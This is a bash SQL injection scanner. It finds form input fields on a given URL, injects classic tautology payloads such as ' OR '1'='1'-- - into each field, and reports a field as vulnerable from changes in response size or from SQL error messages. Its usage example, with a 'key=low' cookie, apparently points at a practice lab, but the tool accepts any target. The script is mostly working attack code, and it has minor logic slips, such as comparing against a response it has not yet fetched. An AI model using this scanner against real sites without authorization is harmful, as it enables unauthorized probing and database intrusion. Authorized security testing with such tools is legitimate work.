#!/bin/bash

# =========================
# Configuration
# =========================
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
TIMEOUT=5
threads=10
verbose=false

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# =========================
# curl helpers
# =========================

curl_body() {
    local url="$1"

    [ "$verbose" = true ] && echo "[curl-body] $url" >&2

    curl -s -L \
        --max-time "$TIMEOUT" \
        -A "$USER_AGENT" \
        --parallel --parallel-max "$threads" \
        "${CURL_OPTS[@]}" \
        "$url"
}

curl_status() {
    local url="$1"

    [ "$verbose" = true ] && echo "[curl-status] $url" >&2

    curl -s \
        -o /dev/null \
        -w "%{http_code}" \
        --max-time "$TIMEOUT" \
        -A "$USER_AGENT" \
        --parallel --parallel-max "$threads" \
        "${CURL_OPTS[@]}" \
        "$url"
}

# =========================
# HTML helpers
# =========================

has_input_elements() {
    local html="$1"

    echo "$html" | grep -qi \
        "<input\|<form\|<textarea\|<select\|document\.forms\|\.submit()\|addEventListener.*submit\|fetch.*POST\|axios\.post"
}

extract_input_fields() {
    local html="$1"

    echo "$html" |
        grep -Ei '<input|<textarea|<select' |
        grep -oE 'name=["'\'']?[^"'\'' >]+' |
        sed 's/name=["'\'']//g' |
        sort -u
}

extract_submit_fields() {
    local html="$1"

    echo "$html" |
        grep -Ei '<input[^>]+type=["'\'']?submit|<button[^>]+type=["'\'']?submit' |
        grep -oE 'name=["'\'']?[^"'\'' >]+' |
        sed 's/name=["'\'']//g' |
        sort -u
}

# Helper to check specific pattern changes
check_pattern_changes() {
    local original_body="$1"
    local sql_body="$2"
    
    # Common patterns to check
    patterns=(
        "product" "item" "row" "record" "entry"
        "<div>" "<tr>" "<li>" "<img " "href= <pre>"
    )
    
    echo "Element Count Analysis:"
    for pattern in "${patterns[@]}"; do
        orig_count=$(echo "$original_body" | grep -c "$pattern")
        sql_count=$(echo "$sql_body" | grep -c "$pattern")
        
        if [ "$orig_count" -ne "$sql_count" ]; then
            change=$(( sql_count - orig_count ))
            echo -e "      $pattern: ${orig_count} → ${sql_count} (+${change})"
        fi
    done
    
    # Check for SQL error messages
    if echo "$sql_body" | grep -qiE "(sql syntax|syntax error|mysql.*error|postgresql.*error|oracle.*error)"; then
        echo "    [!] SQL error message detected in sql_body"
        echo "$sql_body"
    fi
}

# =========================
# SQL injection testing
# =========================

test_input_sqli() {
    local url="$1"
    local field="$2"

    echo -e "${BLUE}[*] Testing field: $field${NC}"

    local base_value="test"
    local base_url

    if [[ "$url" == *"?"* ]]; then
        base_url="${url}&${field}=${base_value}"
    else
        base_url="${url}?${field}=${base_value}"
    fi

    local original_body
    original_body=$(curl_body "$base_url")
    local original_body_size
    original_body_size=$(printf "%s" "$original_body" | wc -c)
    

    for payload in "${SQLI_PAYLOADS[@]}"; do
        encoded=$(curl -sG \
            --data-urlencode "$field=$payload" \
            -o /dev/null \
            -w '%{url_effective}' \
            "$url" | sed "s/^.*[?&]$field=//")

        local test_url
        if [[ "$url" == *"?"* ]]; then
            test_url="${url}&${field}=${encoded}&Submit=Submit"
        else
            test_url="${url}?${field}=${encoded}&Submit=Submit"
        fi

         # Check for common patterns
         check_pattern_changes "$original_body" "$sql_body"



        sql_body=$(curl_body "$test_url")
        #echo -e "${YELLOW}$sql_body{$NC}" #DEBUG echo
        sql_body_size=$(printf "%s" "$sql_body" | wc -c)
        diff=$(( sql_body_size - original_body_size ))
        echo "Difference in sql_body:$diff"
        if (( diff > 50 || diff < -50 )); then
            echo -e "${RED}[!] Possible SQLi on '$field' payload: $payload (Δ=$diff bytes)${NC}"
            return 0
        fi
    done

    return 1
}

# =========================
# Main logic
# =========================

test_page_for_sqli() {
    local url="$1"

    echo -e "${GREEN}[*] Analyzing: $url${NC}"

    sql_body=$(curl_body "$url")
#    echo "$sql_body"
echo -e "{$YELLOW}--------------------------------${NC}"
submit_fields=$(extract_submit_fields "$sql_body")
submit_field=$(echo "$submit_fields" | head -n1)
echo "Submit Field:$submit_field"


    if ! has_input_elements "$sql_body"; then
        echo -e "${YELLOW}[-] No input elements found${NC}"
        return
    fi

    echo -e "${GREEN}[+] Page contains input elements${NC}"

    fields=$(extract_input_fields "$sql_body")
    field_count=$(echo "$fields" | wc -l)

    echo -e "${BLUE}[+] Found $field_count input field(s):${NC}"
    echo "$fields" | sed 's/^/  - /'

    for field in $fields; do
        if test_input_sqli "$url" "$field"; then
            echo -e "\n${RED}[VULNERABLE] SQL ⚠️ Injection found in field: $field${NC}"
            echo -e "  URL: $url"
            return
        fi
    done

    echo -e "${GREEN}[+] No obvious SQL injection detected${NC}"
}

# =========================
# Payloads
# =========================

SQLI_PAYLOADS=(
    "' OR '1'='1'-- -"
    "' OR 1=1-- -"
    "\" OR \"1\"=\"1\"-- -"
)

# =========================
# Entry point
# =========================

if [ -z "$1" ]; then
    echo "Usage: $0 <url> [curl options]"
    echo "Example:"
    echo "  $0 https://target -H \"Cookie: PHPSESSID=123; key=low\""
    exit 1
fi

URL="$1"
shift
CURL_OPTS=("$@")

test_page_for_sqli "$URL"
